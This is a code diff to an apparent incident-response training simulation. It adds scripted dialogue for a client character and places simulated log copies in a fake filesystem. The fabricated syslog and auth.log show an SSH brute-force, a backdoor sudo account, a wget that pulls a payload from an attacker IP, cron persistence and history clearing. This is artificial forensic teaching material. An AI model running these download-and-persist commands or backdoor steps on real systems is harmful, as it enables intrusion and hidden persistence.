@@ -1494,7 +1494,7 @@ const jordanResponses = [
   {
     keys: ['logs','logging','log retention','siem','monitoring','log file','log files'],
     topic: 'jt-logging',
-    text: "We do have logging enabled on the Linux server — the OS keeps records of logins, account changes, that kind of thing. We set up a basic centralized log collector about 6 months ago. Retention is 30 days, which I've heard might not be enough. The SIEM alerts fire for some things but we don't have someone watching them in real time. It's more of a 'check in the morning' situation. Honestly I never really look at the raw logs myself — that's more of an analyst thing."
+    text: "We do have logging enabled on the Linux server — the OS keeps records of logins, account changes, that kind of thing. We set up a basic centralized log collector about 6 months ago. Retention is 30 days, which I've heard might not be enough. The SIEM alerts fire for some things but we don't have someone watching them in real time. It's more of a 'check in the morning' situation. When I noticed something was off this morning, I grabbed copies of the logs before calling your firm — I didn't want anything to get overwritten. I left them in my home directory if you need them."
   },
   {
     keys: ['backup','backups','recovery','restore','disaster recovery'],
@@ -2050,7 +2050,7 @@ const termFS = {
   '/home/analyst/Documents': { v:['notes.txt','pii.txt'],           h:[],                                      p:'/home/analyst' },
   '/home/analyst/Desktop':   { v:[],                                h:[],                                      p:'/home/analyst' },
   '/home/analyst/logs':   { v:['access.log','error.log'],                     h:[],                                      p:'/home/analyst' },
-  '/home/jreyes':         { v:[],                                              h:['.bash_history','.bashrc'],             p:'/home' },
+  '/home/jreyes':         { v:['auth.log','syslog'],                           h:['.bash_history','.bashrc'],             p:'/home' },
   '/home/service_backup':     { v:[],                                              h:['.bash_history','.ssh'],                p:'/home' },
   '/home/service_backup/.ssh': { v:['authorized_keys'],                           h:[],                                      p:'/home/service_backup' },
   '/home/billing_service':    { v:[],                                              h:['.bashrc'],                             p:'/home' },
@@ -2108,6 +2108,32 @@ May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=service_backup, 
 May 18 02:14:52 clearpath-prod-01 usermod[3252]: add 'service_backup' to group 'sudo'
 May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for service_backup from 185.220.101.42 port 31338 ssh2`,
   '/var/log/syslog': `May 18 02:14:11 clearpath-prod-01 dpkg: install netcat-openbsd:amd64 1.218-4ubuntu1
+May 18 02:14:14 clearpath-prod-01 dpkg: install wget:amd64 1.21.2-2ubuntu1
+May 18 02:14:38 clearpath-prod-01 kernel: [3249] root wget -q http://185.220.101.42:8080/update_check -O /tmp/.update_check
+May 18 02:14:50 clearpath-prod-01 kernel: [3253] root echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/service_backup_task
+May 18 02:14:55 clearpath-prod-01 CRON[3260]: (root) CMD (/tmp/.update_check 2>/dev/null)
+May 18 02:19:55 clearpath-prod-01 CRON[3301]: (root) CMD (/tmp/.update_check 2>/dev/null)
+May 18 02:22:01 clearpath-prod-01 kernel: [3295] root history -c
+May 18 02:24:55 clearpath-prod-01 CRON[3341]: (root) CMD (/tmp/.update_check 2>/dev/null)`,
+  '/home/jreyes/auth.log': `# Copied from /var/log/auth.log — pulled by jreyes on May 18 08:00
+# "I grabbed these before calling your firm in, just in case." — Jordan
+[showing last 20 lines — use grep for specific patterns]
+May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2
+May 18 01:52:31 clearpath-prod-01 sshd[3202]: Failed password for root from 185.220.101.42 port 30002 ssh2
+May 18 01:53:00 clearpath-prod-01 sshd[3203]: Failed password for root from 185.220.101.42 port 30003 ssh2
+May 18 01:53:28 clearpath-prod-01 sshd[3204]: Failed password for root from 185.220.101.42 port 30004 ssh2
+May 18 01:54:01 clearpath-prod-01 sshd[3205]: Failed password for root from 185.220.101.42 port 30005 ssh2
+...
+[47 total failed attempts — use grep to analyze]
+...
+May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2
+May 18 02:14:33 clearpath-prod-01 sshd[3248]: pam_unix(sshd:session): session opened for user root
+May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=service_backup, UID=1004, GID=0, home=/home/service_backup
+May 18 02:14:52 clearpath-prod-01 usermod[3252]: add 'service_backup' to group 'sudo'
+May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for service_backup from 185.220.101.42 port 31338 ssh2`,
+  '/home/jreyes/syslog': `# Copied from /var/log/syslog — pulled by jreyes on May 18 08:00
+# "I grabbed these before calling your firm in, just in case." — Jordan
+May 18 02:14:11 clearpath-prod-01 dpkg: install netcat-openbsd:amd64 1.218-4ubuntu1
 May 18 02:14:14 clearpath-prod-01 dpkg: install wget:amd64 1.21.2-2ubuntu1
 May 18 02:14:38 clearpath-prod-01 kernel: [3249] root wget -q http://185.220.101.42:8080/update_check -O /tmp/.update_check
 May 18 02:14:50 clearpath-prod-01 kernel: [3253] root echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/service_backup_task
